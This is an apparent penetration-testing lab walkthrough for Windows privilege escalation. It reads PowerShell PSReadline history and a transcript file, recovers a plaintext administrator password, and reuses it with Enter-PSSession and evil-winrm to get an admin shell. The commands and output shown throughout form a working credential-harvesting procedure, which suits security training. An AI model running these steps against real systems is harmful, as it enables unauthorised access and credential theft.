---
description: Example of leveraging poorly secured PowerShell logs for privilege escalation
---

# Information Goldmine PowerShell

As noted [previously](manual-enumeration.md#powershell-history), PowerShell history can contain quite a bit of information.

## Background and Assumptions

This example will continue with a compromised Windows machine (`CLIENTWK220`), onto which the attacker is assumed to have placed a bind shell accessible via port `4444`. The bind shell is running as user `dave`.

## PSReadline

Given that the standard history often has little information, this example will begin with a check of whether [PSReadline](manual-enumeration.md#psreadline-history) is enabled:

```powershell
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath

C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It seems PSReadline is enabled! The file returned can be read to see if it contains any valuable information:

{% code title="ConsoleHost_history.txt" %}
```
whoami
ls
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```
{% endcode %}

Based on this output:

* KeePass is running on the system
* Transcript is enabled

## PowerShell Transcript

Based on the [previous section](information-goldmine-powershell.md#psreadline), it seems that [PowerShell Transcription](manual-enumeration.md#transcription) is enabled and outputting to `C:\Users\Public\Transcripts\transcript01.txt`. That file can be examined for further clues:

{% code title="transcript01.txt" lineNumbers="true" %}
```
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.22000.282
BuildVersion: 10.0.22000.282
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************
```
{% endcode %}

Of the output in `transcript01.txt`, lines 20-22 are perhaps the most interesting. Those lines show some commands that create a [PSCredential](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.3.0) object that appears to have the daveadmin account (discovered in the [manual enumeration section](manual-enumeration.md)).

Replicating these commands via the reverse shell appears to grant elevation of privileges:

```powershell
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```

Unfortunately things quickly go off the rails:

```
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd

```

The commands are now returning blank outputs. With things like `dir` this could just be an empty folder but `pwd` should always return a path. This is likely because [Enter-PSSession](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.3) can often cause problems when used with a bind shell.

## evil-winrm

This is where [evil-winrm](https://github.com/Hackplayers/evil-winrm) can come in handy. Recall from&#x20;

[earlier](manual-enumeration.md) that daveadmin is a member of the `Remote Management Users` group:

```
PS C:\Users\dave> net user daveadmin
...
Local Group Memberships      *Administrators       *adminteam            
                             *Remote Management Use*Users                
Global Group memberships     *None
```

&#x20;Given that the user has the proper permissions, and the attacker found the account credentials (`daveadmin:qwertqwertqwert123!!`) in the [transcript](information-goldmine-powershell.md#powershell-transcript), `evil-winrm` can be used to access the system:

```
evil-winrm -i 192.168.213.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

* `-i` indicates the IP address of the target
* `-u` is the username
* `-p` is the password
  * Note the exclamation points (`!`) were character escaped

Executing this command on against the target results in:

```shell-session
kali@kali:~$ evil-winrm -i 192.168.213.220 -u daveadmin -p "qwertqwertqwert123\!\!"
                                    
Evil-WinRM shell v3.5
...
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin

*Evil-WinRM* PS C:\Users\daveadmin\Documents>
```
